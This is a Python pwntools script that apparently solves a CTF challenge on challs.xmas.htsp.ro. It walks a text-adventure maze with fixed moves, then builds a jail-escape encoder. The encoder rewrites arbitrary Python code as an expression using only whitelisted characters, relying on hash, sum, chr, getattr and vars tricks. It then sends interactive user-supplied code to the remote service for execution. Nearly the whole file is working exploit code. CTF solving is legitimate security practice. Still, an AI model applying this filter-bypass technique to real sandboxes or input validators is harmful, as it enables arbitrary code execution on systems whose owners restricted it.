from pwn import *

maze_payload = ["east", "take can", "use can", "take bow", "west", "north", "west", "use can", "take snare", "east", "south", "west", "use can", "take timer", "east", "north", "east", "east", "east", "take gem", "west", "west", "west"]

HOST = 'challs.xmas.htsp.ro'
PORT = 6001

p = remote(HOST, PORT)

for payload in maze_payload:
    p.recvuntil('> ')
    p.sendline(payload)
    p.recvuntil('YOU')
p.recvuntil('GOOD LUCK!')

ALLOWED_CHARS = "gemhuntersnarecantimer(),/v"

def create_one():
    return "int(hash(int)/hash(int))"

def create_number(n):
    return "sum((" + ",".join([create_one()] * n) + "))"

def create_char(c):
    return "chr(" + create_number(ord(c)) + ")"

def create_string(s):
    chars = [create_char(c) for c in s]
    out = chars[0]
    for c in chars[1:]:
        out = "getattr(str,min(vars(str)))(" + out + "," + c + ")"
    return out

def create_payload(code):
    p = create_string(code)
    for c in p:
        if c not in ALLOWED_CHARS:
            raise Exception("Invalid char: " + c)
    return p

while True:
    print(p.recvuntil('> '))
    user_input = raw_input().rstrip()
    if user_input == 'exit':
        break
    else:
        payload = create_payload(user_input)
    p.sendline(payload)

p.close()